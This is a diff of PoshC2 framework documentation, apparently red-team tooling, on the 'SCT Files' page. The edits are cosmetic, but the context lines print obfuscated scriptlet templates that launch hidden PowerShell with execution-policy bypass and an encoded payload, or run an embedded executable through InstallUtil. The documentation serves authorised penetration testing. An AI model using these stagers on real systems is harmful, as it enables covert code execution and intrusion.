@@ -188,11 +188,11 @@
   <div class="section" id="sct-files">
 <h1>SCT Files<a class="headerlink" href="#sct-files" title="Permalink to this headline">¶</a></h1>
 <p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1086">Powershell</a></p>
-<p>SCT Files can be used in many execution methods, most of which have been discovered by SubTee. PoshC2 utilised a few of
-these methods and hosts these seperately so you can use this for execution.</p>
+<p>SCT Files can be used by many execution methods, most of which have been discovered by SubTee. PoshC2 utilised a few of
+these methods and hosts the files separately, to be used for execution.</p>
 <div class="section" id="jscript-powershell-execution">
 <h2>JScript Powershell Execution<a class="headerlink" href="#jscript-powershell-execution" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-powershell"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="n">sCrIptlEt</span><span class="p">&gt;&lt;</span><span class="n">scRIPt</span><span class="p">&gt;</span>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="n">sCrIptlEt</span><span class="p">&gt;&lt;</span><span class="n">scRIPt</span><span class="p">&gt;</span>
 <span class="n">a</span><span class="p">=</span><span class="n">new</span> <span class="n">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Shell.Application&quot;</span><span class="p">).</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&quot;powershell.exe&quot;</span><span class="p">,</span><span class="s2">&quot; -exec bypass -Noninteractive -windowstyle hidden -e &lt;base64 encoded payload&gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;open&quot;</span><span class="p">,</span><span class="s2">&quot;0&quot;</span><span class="p">);</span>
 <span class="p">&lt;/</span><span class="n">scRIPt</span><span class="p">&gt;&lt;/</span><span class="n">sCrIptlEt</span><span class="p">&gt;</span>
 </pre></div>
@@ -200,7 +200,7 @@ these methods and hosts these seperately so you can use this for execution.</p>
 </div>
 <div class="section" id="vbscript-execute-exe-with-installutil">
 <h2>VBScript Execute EXE with InstallUtil<a class="headerlink" href="#vbscript-execute-exe-with-installutil" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-powershell"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="n">sCrIptlEt</span><span class="p">&gt;</span>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="n">sCrIptlEt</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="n">ScRIpt</span> <span class="n">language</span><span class="p">=</span><span class="s2">&quot;VBSCRIPT&quot;</span><span class="p">&gt;</span>
 <span class="n">102bi06dul</span> <span class="p">=</span> <span class="s2">&quot;&lt;base64 encoded standalone executable&gt;&quot;</span>
 
@@ -235,7 +235,7 @@ these methods and hosts these seperately so you can use this for execution.</p>
 </div>
 <div class="section" id="vbscript-powershell-execution">
 <h2>VBScript Powershell Execution<a class="headerlink" href="#vbscript-powershell-execution" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-powershell"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="k">?</span><span class="n">XML</span> <span class="n">version</span><span class="p">=</span><span class="s2">&quot;1.0&quot;</span><span class="p">?&gt;</span>
+<div class="highlight-Powershell notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="k">?</span><span class="n">XML</span> <span class="n">version</span><span class="p">=</span><span class="s2">&quot;1.0&quot;</span><span class="p">?&gt;</span>
 <span class="p">&lt;</span><span class="n">scriptlet</span><span class="p">&gt;</span>
 
 <span class="p">&lt;</span><span class="n">registration</span>
